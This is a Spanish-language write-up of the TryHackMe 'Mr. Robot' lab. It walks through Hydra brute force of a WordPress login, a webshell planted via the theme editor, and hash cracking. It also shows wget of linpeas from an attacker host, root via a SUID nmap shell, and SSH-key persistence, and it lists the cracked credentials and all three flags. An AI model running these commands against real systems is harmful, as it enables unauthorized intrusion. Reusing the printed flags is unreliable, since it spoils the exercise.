# Mr. Robot — TryHackMe

**Plataforma:** TryHackMe
**Sistema operativo:** Linux
**Dificultad:** Media
**Categoría:** WordPress bruteforce, Webshell, SUID binary abuse (nmap)

## Resumen

Máquina Linux temática de la serie *Mr. Robot* que expone un sitio WordPress. Mediante un diccionario propio del CTF (`fsociety.dic`) se realiza fuerza bruta para obtener credenciales válidas, se sube una webshell a través del editor de temas de WordPress, y se escala privilegios abusando de un binario con permiso SUID (`nmap` en modo interactivo).

## 1. Reconocimiento

Escaneo inicial con el script `alien-script` y Nmap:

```bash
nmap -n -Pn -sV -sC -vv --min-rate 3000 -p22,80,443 -oA nmap/version_scan <IP>
```

| IP | Sistema Operativo | Puertos/Servicios |
|---|---|---|
| Objetivo | Linux | 22 (SSH), 80 (HTTP), 443 (HTTPS) |

Al acceder por navegador se encontró un *rabbit hole* (una terminal interactiva ficticia estilo fsociety), lo que indicó que había que profundizar más en el reconocimiento web.

## 2. Análisis de vulnerabilidades

Escaneo de vulnerabilidades:

```bash
nmap -n -Pn --min-rate 3000 -vv --script vuln -p22,80,443 -oA nmap/vuln_scan <IP>
```

| Puerto | Servicio | Detalle |
|---|---|---|
| 22 | OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 | — |
| 80 | Apache httpd | WordPress detectado |
| 443 | Apache httpd | — |

El archivo `robots.txt` reveló dos recursos clave:

- La **primera bandera**.
- Un diccionario de palabras: `fsocity.dic`.

El diccionario se descargó y se depuró de duplicados:

```bash
wget http://<IP>/fsocity.dic
sort -u fsocity.dic > fsocity_clean.txt
```

(De 858,160 líneas se redujo a 11,451 líneas únicas.)

## 3. Explotación

**Manual** — sin automatización completa.

### Fuzzing de directorios

```bash
gobuster dir -u http://<IP> -t 40 -w /usr/share/dirb/wordlists/common.txt \
  -x txt,php,zip -s 200,204,301,302,307,401,403 -b "" -t 200 -k
```

Resultado relevante: `/wp-admin` → confirma WordPress.

### Identificación de usuario válido

WordPress permitía diferenciar (por el mensaje de error) si un usuario existía o no. Con Hydra y el diccionario depurado:

```bash
hydra -L fsocity_clean.txt -p test -t 64 -f <IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In: Invalid username" -V
```

**Usuario encontrado:** `elliot`

### Fuerza bruta de contraseña

```bash
hydra -l Elliot -P fsocity_clean.txt -t 64 -f <IP> http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In: The password you entered for the username" -V
```

**Credenciales obtenidas:** `elliot : ER28-0652`

### Carga de webshell

Dentro del panel de administración (*Appearance → Editor*), se modificó la plantilla `404.php` para insertar una webshell PHP, obteniendo ejecución remota de comandos vía navegador.

### Acceso a archivos internos

En `/home/` se identificaron los usuarios `ubuntu` y `robot`. En el directorio de `robot`:

- **Segunda bandera** (sin permisos de lectura directos).
- Archivo `password.raw-md5`.

El hash MD5 se crackeó con HashID + CrackStation, obteniendo la contraseña en texto claro: `abcdefghijklmnopqrstuvwxyz`.

Con esas credenciales se accedió por SSH y se leyó la **segunda bandera**.

También se probó, como alternativa, cargar un script de reverse shell PHP en la plantilla de WordPress, obteniendo acceso directo como `www-data` vía listener local.

## 4. Escalada de privilegios

Se subió **linpeas.sh** a `/dev/shm` y se ejecutó:

```bash
wget http://<IP_atacante>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS identificó un binario con permiso **SUID**: `/usr/local/bin/nmap`.

Verificación manual:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Confirmado en GTFOBins como explotable. Ejecución:

```bash
nmap --interactive
nmap> !sh
whoami
root
```

**Tercera bandera (root)** leída en `/root/key-3-of-3.txt`.

### Persistencia (extra opcional)

Se implementó persistencia agregando la clave pública SSH del atacante al archivo `authorized_keys` de root, sin crear usuarios nuevos ni modificar contraseñas:

```bash
ssh-keygen -t rsa -b 4096
cat ~/.ssh/id_rsa.pub
# En la máquina víctima:
mkdir -p /root/.ssh
echo "<clave_pública>" >> /root/.ssh/authorized_keys
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys
```

Acceso persistente verificado con:

```bash
ssh -i ~/.ssh/id_rsa root@<IP>
```

## 5. Banderas

| Bandera | Valor |
|---|---|
| Bandera 1 | `073403c8a58a1f80d943455fb30724b9` |
| Bandera 2 | `822c73956184f694993bede3eb39f959` |
| Bandera 3 (root) | `04787ddef27c3dee1ee161b21670b4e4` |

## 6. Herramientas usadas

- alien-script / Nmap
- Gobuster
- Hydra
- WordPress Theme Editor (vector de webshell)
- HashID / CrackStation
- LinPEAS
- GTFOBins
- SSH

## 7. Conclusiones y recomendaciones

1. La ausencia de límite de intentos de login en WordPress permitió fuerza bruta efectiva.
2. El editor de temas de WordPress es una vía directa a ejecución remota de código si el usuario tiene privilegios de administrador.
3. Un binario SUID mal configurado (`nmap`) permitió escalada trivial a root.
4. **Recomendación:** implementar rate-limiting o 2FA en WordPress, restringir el editor de temas, y auditar binarios con permisos SUID innecesarios.
